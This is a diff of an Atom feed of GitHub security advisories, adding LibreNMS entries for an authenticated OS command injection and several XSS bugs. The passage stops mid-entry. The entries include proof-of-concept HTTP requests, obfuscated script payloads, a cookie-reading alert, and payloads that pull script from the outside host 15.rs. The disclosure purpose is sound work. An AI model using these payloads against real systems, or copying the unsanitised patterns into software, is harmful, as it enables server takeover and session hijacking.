@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://azu.github.io/github-advisory-database-rss/composer.rss</id>
     <title>Security Advisory for PHP packages hosted at packagist.org</title>
-    <updated>2024-11-15T15:01:29.440Z</updated>
+    <updated>2024-11-15T16:01:32.038Z</updated>
     <generator>github-advisory-database-rss</generator>
     <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Acomposer"/>
     <subtitle>Security Advisory for PHP packages hosted at packagist.org on GitHub</subtitle>
@@ -11,6 +11,682 @@
     <category term="HIGH"/>
     <category term="MODERATE"/>
     <category term="LOW"/>
+    <entry>
+        <title type="html"><![CDATA[[librenms/librenms] LibreNMS has an Authenticated OS Command Injection]]></title>
+        <id>https://github.com/advisories/GHSA-x645-6pf9-xwxw</id>
+        <link href="https://github.com/advisories/GHSA-x645-6pf9-xwxw"/>
+        <updated>2024-11-15T15:54:19.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
+<p>An authenticated attacker can create dangerous directory names on the system and alter sensitive configuration parameters through the web portal. Those two defects combined then allows to inject arbitrary OS commands inside <code>shell_exec()</code> calls, thus achieving arbitrary code execution.</p>
+<h3 id="details">Details</h3>
+<h4 id="os-command-injection">OS Command Injection</h4>
+<p>We start by inspecting the file <code>app/Http/Controllers/AboutController.php</code>, more particularly the index() method which is executed upon simply visiting the /about page:</p>
+<pre><code class="language-php">public function index(Request $request)
+    {
+        $version = Version::get();
+
+        return view('about.index', [
+            &lt;TRUNCATED&gt;
+
+            'version_webserver' =&gt; $request-&gt;server('SERVER_SOFTWARE'),
+            'version_rrdtool' =&gt; Rrd::version(),
+            'version_netsnmp' =&gt; str_replace('version: ', '', rtrim(shell_exec(Config::get('snmpget', 'snmpget') . ' -V 2&gt;&amp;1'))),
+
+           &lt;TRUNCATED&gt;
+        ]);
+    }
+</code></pre>
+<p>We can see that the <code>version_netsnmp</code> key receives a value direclty dependent of a <code>shell_exec()</code> call. The argument to this call reflects a configuration parameter with no sanitization. Should an attacker identify a way to alter this parameter, the server is at risk of being compromised.</p>
+<h4 id="configuration-parameters-poisoning">Configuration parameters poisoning</h4>
+<p>We now focus on the <code>update()</code> method of the <code>SettingsController.php</code> script. This method is called when the user visits the route <code>/settings/{key}</code> via HTTP PUT. The key parameter here is simply the name of the configuration key the user wishes to modify.</p>
+<pre><code class="language-php">public function update(DynamicConfig $config, Request $request, $id)
+{
+    $value = $request-&gt;get('value');
+
+    if (! $config-&gt;isValidSetting($id)) {
+        return $this-&gt;jsonResponse($id, ':id is not a valid setting', null, 400);
+    }
+
+    $current = \LibreNMS\Config::get($id);
+    $config_item = $config-&gt;get($id);
+
+    if (! $config_item-&gt;checkValue($value)) {
+        return $this-&gt;jsonResponse($id, $config_item-&gt;getValidationMessage($value), $current, 400);
+    }
+
+    if (\LibreNMS\Config::persist($id, $value)) {
+        return $this-&gt;jsonResponse($id, "Successfully set $id", $value);
+    }
+
+    return $this-&gt;jsonResponse($id, 'Failed to update :id', $current, 400);
+}
+</code></pre>
+<p>We can see that some protections are implemented around the configuration parameters by <code>$config_item-&gt;checkValue($value)</code>, with a format of data being expected depending on the data type of the variable the user wants to modify.
+Specifically, the <code>snmpget</code> configuration variable expects a valid path to an existing binary on the system.
+To summarize : if an attacker finds a valid full-path to a system binary, while that full-path also holds shell metacharacters, then those characters would be interpreted by the <code>shell_exec()</code> call defined above and allow for arbitrary command execution.</p>
+<h4 id="arbitrary-directory-creation">Arbitrary directory creation</h4>
+<p>When creating a new Device through the "Add Device" page, the server allows the user to send malformed or impossible hostnames and force the data to be stored, with no sanitization being performed on this field.</p>
+<p>In the file <code>app/Jobs/PollDevice.php</code>, the <code>initRrdDirectory()</code> method is responsible for creating a directory named after the Device's hostname. We can see the <code>mkdir()</code> call inside the try block:</p>
+<pre><code class="language-php">private function initRrdDirectory(): void
+{
+    $host_rrd = \Rrd::name($this-&gt;device-&gt;hostname, '', '');
+    if (Config::get('rrd.enable', true) &amp;&amp; ! is_dir($host_rrd)) {
+        try {
+            mkdir($host_rrd);
+            Log::info("Created directory : $host_rrd");
+        } catch (\ErrorException $e) {
+            Eventlog::log("Failed to create rrd directory: $host_rrd", $this-&gt;device);
+            Log::info($e);
+        }
+    }
+}
+</code></pre>
+<p>This method is called by <code>initDevice()</code>, which is itself called by the <code>handle()</code> method (executed when the job starts).
+<code>\Rrd::name()</code> simply concatenates a string following the format <code>&lt;LIBRENMS_INSTALL_DIR&gt;/rrd/&lt;DEVICE_HOSTNAME&gt;</code>.</p>
+<h4 id="summary-1">Summary</h4>
+<p>With all this, an authenticated attacker can:</p>
+<ul>
+<li>Create a malicious Device with shell metacharacters inside its hostname</li>
+<li>Force the creation of directory containing shell metacharacters through the PollDevice job</li>
+<li>Modify the <code>snmpget</code> configuration variable to point to a valid system binary, while also using the directory created in the previous step via a path traversal (i.e: <code>/path/to/install/dir/rrd/&lt;DEVICE_HOSTNAME&gt;/../../../../../../../bin/ls</code>)</li>
+<li>Trigger a code execution via the <code>shell_exec()</code> call contained in the <code>AboutController.php</code> script</li>
+</ul>
+<h4 id=""></h4>
+<h3 id="poc">PoC</h3>
+<p>For proof of concept, we will create a file located at <code>/tmp/rce-proof</code> on the server's filesystem.</p>
+<p>Consider the following command : <code>/usr/bin/touch /tmp/rce-proof</code>, encoded in base64 (<code>L3Vzci9iaW4vdG91Y2ggL3RtcC9yY2UtcHJvb2Y=</code>). This encoding is necesary whenever the command contains '/' characters, as this would otherwise generate invalid directory paths.
+Create a new Device with a name that contains the command you wish to execute enclosed in semi-colons, ending with a '3' character:
+<img alt="librenms-1" src="https://github.com/user-attachments/assets/a242fc1a-f04a-4df9-901e-abcc5f14af14"></p>
+<p>Be careful to tick the "Force Add" option, otherwise the request will be rejected. Click add:
+<img alt="librenms-2" src="https://github.com/user-attachments/assets/84e0d853-1418-44aa-870b-4259adba27f8"></p>
+<p>A directory matching the hostname of the Device will be created whenever a PollDevice job is launched. For the purpose of the demonstration, we will be triggering this manually with artisan:
+<img alt="librenms-4" src="https://github.com/user-attachments/assets/ce4061ef-6cb6-4847-a229-1417091048f5"></p>
+<p>We can confirm that this directory indeed exists on the system:
+<img alt="librenms-5" src="https://github.com/user-attachments/assets/79f912c6-f200-47d2-b950-d46636dc30ef"></p>
+<p>We can now update the <code>snmpget</code> parameter value to point to any binary on the system, making sure that the specified path includes the directory that was just created:
+<img alt="librenms-13" src="https://github.com/user-attachments/assets/4b49c2db-c716-41ae-b668-ff6bf3d5d8de"></p>
+<p>Visiting the <code>/about</code> page will trigger the payload, then we can check that our code was indeed executed:
+<img alt="librenms-10" src="https://github.com/user-attachments/assets/8fcf0838-50b5-47e0-85d5-0892d9909c76"></p>
+<h3 id="impact">Impact</h3>
+<p>Server takeover</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/librenms/librenms/security/advisories/GHSA-x645-6pf9-xwxw">https://github.com/librenms/librenms/security/advisories/GHSA-x645-6pf9-xwxw</a></li>
+<li><a href="https://github.com/advisories/GHSA-x645-6pf9-xwxw">https://github.com/advisories/GHSA-x645-6pf9-xwxw</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-x645-6pf9-xwxw</uri>
+        </author>
+        <category label="severity" term="CRITICAL"/>
+        <published>2024-11-15T15:54:18.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[librenms/librenms] LibreNMS has a Stored XSS ('Cross-site Scripting') in librenms/includes/html/print-customoid.php]]></title>
+        <id>https://github.com/advisories/GHSA-gv4m-f6fx-859x</id>
+        <link href="https://github.com/advisories/GHSA-gv4m-f6fx-859x"/>
+        <updated>2024-11-15T15:46:33.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
+<p>A Stored Cross-Site Scripting (XSS) vulnerability in the "Custom OID" tab of a device allows authenticated users to inject arbitrary JavaScript through the "unit" parameter when creating a new OID. This vulnerability can lead to the execution of malicious code in the context of other users' sessions, compromising their accounts and enabling unauthorized actions.</p>
+<h3 id="details">Details</h3>
+<p>When creating a new OID for a device, an attacker can inject an XSS payload into the "unit" parameter. This payload is reflected in the "Unit" column of the table displayed in the "Custom OID" tab of the device.</p>
+<p>The payload used to exploit this vulnerability is:
+<code>&lt;script/src=//15.rs&gt;</code></p>
+<p>Note: The payload uses the "15.rs" domain to bypass some of the length restrictions found during research by pointing to a malicious remote file. The file contains a POC XSS payload, and can contain any arbitrary JS code.</p>
+<p>The vulnerability is due to improper sanitization of the "unit" parameter before rendering it in the HTML output. The sink is as follows:
+<a href="https://github.com/librenms/librenms/blob/7f2ae971c4a565b0d7345fa78b4211409f96800a/includes/html/print-customoid.php#L90">https://github.com/librenms/librenms/blob/7f2ae971c4a565b0d7345fa78b4211409f96800a/includes/html/print-customoid.php#L90</a></p>
+<h3 id="poc">PoC</h3>
+<ol>
+<li>Create a new OID for a device using the following payload in the "unit" parameter:</li>
+</ol>
+<p><code>&lt;script/src=//15.rs&gt;</code>
+2. Save the OID.
+3. Navigate to the "Custom OID" tab of the device.
+4. Observe that the injected script executes in the "Unit" column of the table.</p>
+<p>Example Request:</p>
+<pre><code class="language-http">POST /ajax_form.php HTTP/1.1
+Host: &lt;your_host&gt;
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+X-CSRF-TOKEN: &lt;your_token&gt;
+X-Requested-With: XMLHttpRequest
+Cookie: &lt;your_cookie&gt;
+
+device_id=15&amp;device_name=test4'&amp;ccustomoid_id=2&amp;type=customoid&amp;action=save&amp;name=test1&lt;script&gt;{onerror=alert}throw+'OID'&lt;/script&gt;&amp;oid=test2&lt;script&gt;{onerror=alert}throw+'OID'&lt;/script&gt;&amp;unit=&lt;script/src=//15.rs&gt;&amp;divisor=1&amp;multiplier=1&amp;user_func=test4&lt;script&gt;{onerror=alert}throw+'OID'&lt;/script&gt;&amp;limit=0&amp;limit_low=0&amp;limit_warn=0&amp;limit_low_warn=0&amp;passed=on
+</code></pre>
+<h3 id="impact">Impact</h3>
+<p>This vulnerability allows authenticated users to inject and execute arbitrary JavaScript in the context of other users' sessions when they visit the "Custom OID" tab of the device. This could lead to the compromise of user accounts and unauthorized actions being performed on their behalf.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/librenms/librenms/security/advisories/GHSA-gv4m-f6fx-859x">https://github.com/librenms/librenms/security/advisories/GHSA-gv4m-f6fx-859x</a></li>
+<li><a href="https://github.com/librenms/librenms/commit/42b156e42a3811c23758772ce8c63d4d3eaba59b">https://github.com/librenms/librenms/commit/42b156e42a3811c23758772ce8c63d4d3eaba59b</a></li>
+<li><a href="https://github.com/advisories/GHSA-gv4m-f6fx-859x">https://github.com/advisories/GHSA-gv4m-f6fx-859x</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-gv4m-f6fx-859x</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2024-11-15T15:46:32.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[librenms/librenms] LibreNMS has a Reflected XSS ('Cross-site Scripting') in librenms/includes/html/pages/wireless.inc.php]]></title>
+        <id>https://github.com/advisories/GHSA-28p7-f6h6-3jh3</id>
+        <link href="https://github.com/advisories/GHSA-28p7-f6h6-3jh3"/>
+        <updated>2024-11-15T15:45:32.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
+<p>A Reflected Cross-Site Scripting (XSS) vulnerability in the "metric" parameter of the "/wireless" and "/health" endpoints allows attackers to inject arbitrary JavaScript. This vulnerability results in the execution of malicious code when a user accesses the page with a malicious "metric" parameter, potentially compromising their session and allowing unauthorized actions.</p>
+<h3 id="details">Details</h3>
+<p>The "/wireless" and "/health" endpoints are vulnerable to reflected XSS in the "metric" parameter. An attacker can inject the following XSS payload into the "metric" parameter:
+<code>&lt;script&gt;constructor['constructor'](atob('Y29uZmlybShkb2N1bWVudC5kb21haW4p'))();&lt;!----&gt;</code></p>
+<p>When the page is loaded with this malicious parameter, the script executes immediately. The vulnerability occurs due to improper sanitization of the "metric" parameter in the following sinks:
+<a href="https://github.com/librenms/librenms/blob/7f2ae971c4a565b0d7345fa78b4211409f96800a/includes/html/pages/wireless.inc.php#L82">https://github.com/librenms/librenms/blob/7f2ae971c4a565b0d7345fa78b4211409f96800a/includes/html/pages/wireless.inc.php#L82</a>
+<a href="https://github.com/librenms/librenms/blob/7f2ae971c4a565b0d7345fa78b4211409f96800a/includes/html/pages/health.inc.php#L114">https://github.com/librenms/librenms/blob/7f2ae971c4a565b0d7345fa78b4211409f96800a/includes/html/pages/health.inc.php#L114</a></p>
+<h3 id="poc">PoC</h3>
+<ol>
+<li>Inject the following payload into the "metric" parameter of the "/wireless" or "/health" endpoint:</li>
+</ol>
+<p><code>&lt;script&gt;constructor['constructor'](atob('Y29uZmlybShkb2N1bWVudC5kb21haW4p'))();&lt;!----&gt;</code>
+2. Access the page with the injected payload.
+3. Observe that the injected script executes upon loading the page.</p>
+<p>Example URL: <code>http://&lt;your_url&gt;/wireless/metric=%3Cscript%3Econstructor['constructor'](atob('Y29uZmlybShkb2N1bWVudC5kb21haW4p'))();%3C!----%3E</code></p>
+<p>Example Request:</p>
+<pre><code class="language-http">GET /wireless/metric=%3Cscript%3Econstructor[%27constructor%27](atob(%27Y29uZmlybShkb2N1bWVudC5kb21haW4p%27))();%3C!----%3E HTTP/1.1
+Host: &lt;your_host&gt;
+Cookie: &lt;your cookies&gt;
+</code></pre>
+<h3 id="impact">Impact</h3>
+<p>This vulnerability allows attackers to execute arbitrary JavaScript in the context of a user’s session by crafting a malicious URL. The attack could lead to session hijacking, unauthorized actions, or further exploitation by injecting malicious scripts.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/librenms/librenms/security/advisories/GHSA-28p7-f6h6-3jh3">https://github.com/librenms/librenms/security/advisories/GHSA-28p7-f6h6-3jh3</a></li>
+<li><a href="https://github.com/librenms/librenms/commit/aef739a438ffb507e927a4ec87b359164a7a053a">https://github.com/librenms/librenms/commit/aef739a438ffb507e927a4ec87b359164a7a053a</a></li>
+<li><a href="https://github.com/advisories/GHSA-28p7-f6h6-3jh3">https://github.com/advisories/GHSA-28p7-f6h6-3jh3</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-28p7-f6h6-3jh3</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2024-11-15T15:45:31.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[librenms/librenms] LibreNMS has a Stored XSS ('Cross-site Scripting') in librenms/includes/html/dev-overview-data.inc.php]]></title>
+        <id>https://github.com/advisories/GHSA-p66q-ppwr-q5j8</id>
+        <link href="https://github.com/advisories/GHSA-p66q-ppwr-q5j8"/>
+        <updated>2024-11-15T15:44:28.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
+<p>A Stored Cross-Site Scripting (XSS) vulnerability in the Device Overview page allows authenticated users to inject arbitrary JavaScript through the "overwrite_ip" parameter when editing a device. This vulnerability results in the execution of malicious code when the device overview page is visited, potentially compromising the accounts of other users.</p>
+<h3 id="details">Details</h3>
+<p>The vulnerability occurs when editing a device. An attacker can inject arbitrary JavaScript into the "overwrite_ip" parameter. This malicious script is then executed in the "Assigned IP" field when the device overview page is loaded.</p>
+<p>The payload used to exploit this vulnerability is: <code>test'"&gt;&lt;script src=//15.rs&gt;&lt;/script&gt;</code></p>
+<p>Note: The payload uses the "15.rs" domain to bypass some of the length restrictions found during research by pointing to a malicious remote file. The file contains a POC XSS payload, and can contain any arbitrary JS code.</p>
+<p>The root cause of this vulnerability is the application's failure to properly sanitize the "overwrite_ip" value before including it in the HTML output. This is evident in the following line of code:</p>
+<p><a href="https://github.com/librenms/librenms/blob/7f2ae971c4a565b0d7345fa78b4211409f96800a/includes/html/dev-overview-data.inc.php#L42">https://github.com/librenms/librenms/blob/7f2ae971c4a565b0d7345fa78b4211409f96800a/includes/html/dev-overview-data.inc.php#L42</a></p>
+<h3 id="poc">PoC</h3>
+<ol>
+<li>Edit a device and use the following payload in the "overwrite_ip" parameter: <code>test'"&gt;&lt;script src=//15.rs&gt;&lt;/script&gt;</code></li>
+<li>Save the changes.</li>
+<li>Navigate to the device overview page.</li>
+<li>Observe that the injected script executes in the "Assigned IP" field.</li>
+</ol>
+<pre><code class="language-http">POST /device/14/edit HTTP/1.1
+Host: &lt;your_host&gt;
+Content-Type: application/x-www-form-urlencoded
+Cookie: &lt;your_cookie&gt;
+
+_token=&lt;your_token&gt;&amp;editing=yes&amp;display=&amp;overwrite_ip=test'"&gt;&lt;script+src=//15.rs&gt;&lt;/script&gt;&amp;descr=&amp;type=&amp;parent_id%5B%5D=15&amp;Submit=
+</code></pre>
+<h3 id="impact">Impact</h3>
+<p>This vulnerability allows authenticated users to execute arbitrary JavaScript code in the context of other users' sessions. Compromised accounts could lead to unauthorized actions being taken on behalf of the impacted users.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/librenms/librenms/security/advisories/GHSA-p66q-ppwr-q5j8">https://github.com/librenms/librenms/security/advisories/GHSA-p66q-ppwr-q5j8</a></li>
+<li><a href="https://github.com/librenms/librenms/commit/4568188ce9097a2e3a3b563311077f2bb82455c0">https://github.com/librenms/librenms/commit/4568188ce9097a2e3a3b563311077f2bb82455c0</a></li>
+<li><a href="https://github.com/advisories/GHSA-p66q-ppwr-q5j8">https://github.com/advisories/GHSA-p66q-ppwr-q5j8</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-p66q-ppwr-q5j8</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2024-11-15T15:44:27.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[librenms/librenms] LibreNMS has a Stored XSS ('Cross-site Scripting') in librenms/app/Http/Controllers/Table/EditPortsController.php]]></title>
+        <id>https://github.com/advisories/GHSA-7663-37rg-c377</id>
+        <link href="https://github.com/advisories/GHSA-7663-37rg-c377"/>
+        <updated>2024-11-15T15:43:21.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
+<p>A Stored Cross-Site Scripting (XSS) vulnerability in the "Port Settings" page allows authenticated users to inject arbitrary JavaScript through the "descr" parameter when editing a device's port settings. This vulnerability can lead to the execution of malicious code when the "Port Settings" page is visited, potentially compromising the user's session and allowing unauthorized actions.</p>
+<h3 id="details">Details</h3>
+<p>When editing a device's port settings, an attacker can inject the following XSS payload into the "descr" parameter:
+<code>lo'"&gt;&lt;script/src=//15.rs&gt;</code></p>
+<p>Note: The payload uses the "15.rs" domain to bypass some of the length restrictions found during research by pointing to a malicious remote file. The file contains a POC XSS payload, and can contain any arbitrary JS code.</p>
+<p>The payload triggers when the "Port Settings" page is visited, exploiting the <code>$port-&gt;ifAlias</code> variable in the application. The sink is located here:
+<a href="https://github.com/librenms/librenms/blob/7f2ae971c4a565b0d7345fa78b4211409f96800a/app/Http/Controllers/Table/EditPortsController.php#L82">https://github.com/librenms/librenms/blob/7f2ae971c4a565b0d7345fa78b4211409f96800a/app/Http/Controllers/Table/EditPortsController.php#L82</a></p>
+<h3 id="poc">PoC</h3>
+<ol>
+<li>Edit a device's port settings using the following payload in the "descr" parameter:</li>
+</ol>
+<p><code>lo'"&gt;&lt;script/src=//15.rs&gt;</code>
+2. Save the changes.
+3. Navigate to the "Port Settings" page of the device.
+4. Observe that the injected script executes.</p>
+<p>Example Request:</p>
+<pre><code class="language-http">POST /ajax_form.php HTTP/1.1
+Host: &lt;your_host&gt;
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+X-CSRF-TOKEN: &lt;your_token&gt;
+X-Requested-With: XMLHttpRequest
+Cookie: &lt;your_cookie&gt;
+
+type=update-ifalias&amp;descr=lo'%22%3E%3Cscript%2Fsrc%3D%2F%2F15.rs%3E&amp;ifName=lo&amp;port_id=1&amp;device_id=1
+</code></pre>
+<h3 id="impact">Impact</h3>
+<p>This vulnerability allows authenticated users to execute arbitrary JavaScript in the context of other users' sessions when they visit the "Port Settings" page of the device. This could lead to the compromise of user accounts and unauthorized actions performed on their behalf.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/librenms/librenms/security/advisories/GHSA-7663-37rg-c377">https://github.com/librenms/librenms/security/advisories/GHSA-7663-37rg-c377</a></li>
+<li><a href="https://github.com/librenms/librenms/commit/82a744bfe29017b8b58b5752ab9e1b335bedf0a0">https://github.com/librenms/librenms/commit/82a744bfe29017b8b58b5752ab9e1b335bedf0a0</a></li>
+<li><a href="https://github.com/advisories/GHSA-7663-37rg-c377">https://github.com/advisories/GHSA-7663-37rg-c377</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-7663-37rg-c377</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2024-11-15T15:43:20.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[librenms/librenms] LibreNMS has a Persistent XSS from Insecure Input Sanitization Affects Multiple Endpoints]]></title>
+        <id>https://github.com/advisories/GHSA-4m5r-w2rq-q54q</id>
+        <link href="https://github.com/advisories/GHSA-4m5r-w2rq-q54q"/>
+        <updated>2024-11-15T15:41:39.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
+<p>The application fail to sanitising inputs properly and rendering the code from user input to browser which allow an attacker to execute malicious javascript code.</p>
+<h3 id="details">Details</h3>
+<p>User with Admin role can edit the Display Name of a device, the application did not properly sanitize the user input in the device Display Name, if java script code is inside the name of the device Display Name, its can be trigger from different sources.</p>
+<h3 id="poc">PoC</h3>
+<ol>
+<li>Use an Admin role user to change the Display Name of a device into the payload <code>&lt;img src="x" onerror="alert(document.cookie)"&gt;</code></li>
+</ol>
+<p><img alt="image" src="https://github.com/user-attachments/assets/a0cce15d-fa25-46cf-a16d-648b501724a4"></p>
+<p>2.1. Go to manage user and choose Manage Access</p>
+<p><img alt="image" src="https://github.com/user-attachments/assets/079bd7a7-c153-4630-a59e-416bbbaf267b"></p>
+<p>2.2. A pop-up will show</p>
+<p><img alt="image" src="https://github.com/user-attachments/assets/2fe15976-c25d-4ba5-a9c1-08cfaa5c1c5b"></p>
+<p>3.1. Create a new Alert Rule where it will check if the device is up or down by using ICMP and then add the rule to the device.</p>
+<p><img alt="image" src="https://github.com/user-attachments/assets/135093ba-d28c-4fe4-871d-950a2d521b01"></p>
+<p>3.2. Once the device is down, there will be an alert in the Alerts Notifications</p>
+<p><img alt="image" src="https://github.com/user-attachments/assets/f32461be-aee2-43e7-ba50-977ed27754b4"></p>
+<p>3.3. Hover over the Hostname will see a pop-up.</p>
+<p><img alt="image" src="https://github.com/user-attachments/assets/314eed99-1372-40e8-818f-4494679e476e"></p>
+<p>4.1. The same can be trigger in the Alert History once hover over the Device field.</p>
+<p><img alt="image" src="https://github.com/user-attachments/assets/33dd2045-2c21-4305-a7a6-8c09101baf81"></p>
+<p>5.1. The same can be trigger once hover over the Hostname field from the Event Log of the device.</p>
+<p><img alt="image" src="https://github.com/user-attachments/assets/a8a80dc7-4678-4334-a03a-e38d61e55e1c"></p>
+<p>6.1. The same can be trigger in the Outages function in the Logs of the device.</p>
+<p><img alt="image" src="https://github.com/user-attachments/assets/b25d1c20-de6d-4c8d-bfab-59691b3faf1e"></p>
+<p>7.1. In the Active Alerts of the device.</p>
+<p><img alt="image" src="https://github.com/user-attachments/assets/73571f83-56e2-4e6f-9af4-621df2a0ccdd"></p>
+<p>8.2. In the Alert History of the device.</p>
+<p><img alt="image" src="https://github.com/user-attachments/assets/1fa4a86b-4469-4e09-a4d8-174529138199"></p>
+<p>9.1. They can also be trigger in the dashboard.</p>
+<p><img alt="image" src="https://github.com/user-attachments/assets/0d3f3926-b41d-48d2-9212-cbd5692f6a9e"></p>
+<p><img alt="image" src="https://github.com/user-attachments/assets/6f36fc02-eae5-4a46-b6ba-f99a8d1db8a8"></p>
+<p>10.1. Also if change the payload into <code>&lt;img src="x" onerror="alert(document['cookie'])"&gt;</code>, it can also be trigger in the Availability Map.</p>
+<p><img alt="image" src="https://github.com/user-attachments/assets/9ed7ebb1-4906-43f0-aa96-313fe722a533"></p>
+<p><img alt="image" src="https://github.com/user-attachments/assets/d7c57840-4431-4ccb-b688-e813c83ac20c"></p>
+<h3 id="impact">Impact</h3>
+<p>It could allow authenticated users to execute arbitrary JavaScript code in the context of other users' sessions.
+Impacted users could have their accounts compromised, enabling the attacker to perform unauthorized actions on their behalf.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/librenms/librenms/security/advisories/GHSA-4m5r-w2rq-q54q">https://github.com/librenms/librenms/security/advisories/GHSA-4m5r-w2rq-q54q</a></li>
+<li><a href="https://github.com/librenms/librenms/commit/bb4731419b592867bf974dde525e536606a52976">https://github.com/librenms/librenms/commit/bb4731419b592867bf974dde525e536606a52976</a></li>
+<li><a href="https://github.com/advisories/GHSA-4m5r-w2rq-q54q">https://github.com/advisories/GHSA-4m5r-w2rq-q54q</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-4m5r-w2rq-q54q</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2024-11-15T15:41:38.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[librenms/librenms] LibreNMS has a Stored XSS ('Cross-site Scripting') in librenms/includes/html/pages/device/overview/services.inc.php]]></title>
+        <id>https://github.com/advisories/GHSA-qr8f-5qqg-j3wg</id>
+        <link href="https://github.com/advisories/GHSA-qr8f-5qqg-j3wg"/>
+        <updated>2024-11-15T15:39:53.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
+<p>A Stored Cross-Site Scripting (XSS) vulnerability in the "Services" section of the Device Overview page allows authenticated users to inject arbitrary JavaScript through the "name" parameter when adding a service to a device. This vulnerability could result in the execution of malicious code in the context of other users' sessions, potentially compromising their accounts and enabling unauthorized actions.</p>
+<h3 id="details">Details</h3>
+<p>When creating a device through the "edit device -&gt; services" workflow (example path: "/device/15/edit/section=services"), the attacker can inject an XSS payload in the "name" parameter. This payload is then reflected in the "Services" section of the "Overview" page of the device. It is important to note that the vulnerability does not exist when creating devices through the normal "Add Service" interface (created through the ajax_form.php request with the "type=create-service").</p>
+<p>The payload used to exploit this vulnerability is:
+<code>Name'"&gt;&lt;script/src=//15.rs&gt;&lt;/script&gt;</code></p>
+<p>Note: The payload uses the "15.rs" domain to bypass some of the length restrictions found during research by pointing to a malicious remote file. The file contains a POC XSS payload, and can contain any arbitrary JS code.</p>
+<p>The root cause is the application's failure to sanitize the "name" parameter before outputting it in the HTML. The sinks are as follows:
+<a href="https://github.com/librenms/librenms/blob/7f2ae971c4a565b0d7345fa78b4211409f96800a/includes/html/pages/device/overview/services.inc.php#L36">https://github.com/librenms/librenms/blob/7f2ae971c4a565b0d7345fa78b4211409f96800a/includes/html/pages/device/overview/services.inc.php#L36</a>
+<a href="https://github.com/librenms/librenms/blob/7f2ae971c4a565b0d7345fa78b4211409f96800a/includes/html/pages/device/overview.inc.php#L74">https://github.com/librenms/librenms/blob/7f2ae971c4a565b0d7345fa78b4211409f96800a/includes/html/pages/device/overview.inc.php#L74</a></p>
+<h3 id="poc">PoC</h3>
+<ol>
+<li>Create a service for a device using the following payload in the "name" parameter:</li>
+</ol>
+<p><code>Name'"&gt;&lt;script/src=//15.rs&gt;&lt;/script&gt;</code>
+2. Save the service.
+3. Navigate to the "Overview" page of the device.
+4. Observe that the injected script executes in the "Services" section of the page.</p>
+<p>Example Request:</p>
+<pre><code class="language-http">POST /device/15/edit/section=services HTTP/1.1
+Host: &lt;your_host&gt;
+Content-Type: application/x-www-form-urlencoded
+Cookie: &lt;your_cookie&gt;
+
+_token=&lt;your_token&gt;&amp;name=Name'"&gt;&lt;script/src=//15.rs&gt;&lt;/script&gt;&amp;addsrv=yes&amp;device=15&amp;type=pollen&amp;descr=Descr'"&gt;&lt;script/src=//15.rs&gt;&lt;/script&gt;&amp;ip=IP'"&gt;&lt;script/src=//15.rs&gt;&lt;/script&gt;&amp;params=Params'"&gt;&lt;script/src=//15.rs&gt;&lt;/script&gt;&amp;Submit=
+</code></pre>
+<h3 id="impact">Impact</h3>
+<p>This vulnerability allows authenticated users to inject and execute arbitrary JavaScript in the context of other users' sessions when they visit the "Services" section of the device's overview page. This could result in the compromise of user accounts and unauthorized actions performed on their behalf.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/librenms/librenms/security/advisories/GHSA-qr8f-5qqg-j3wg">https://github.com/librenms/librenms/security/advisories/GHSA-qr8f-5qqg-j3wg</a></li>
+<li><a href="https://github.com/librenms/librenms/commit/b4af778ca42c5839801f16ece53505bb7fa1e7bc">https://github.com/librenms/librenms/commit/b4af778ca42c5839801f16ece53505bb7fa1e7bc</a></li>
+<li><a href="https://github.com/advisories/GHSA-qr8f-5qqg-j3wg">https://github.com/advisories/GHSA-qr8f-5qqg-j3wg</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
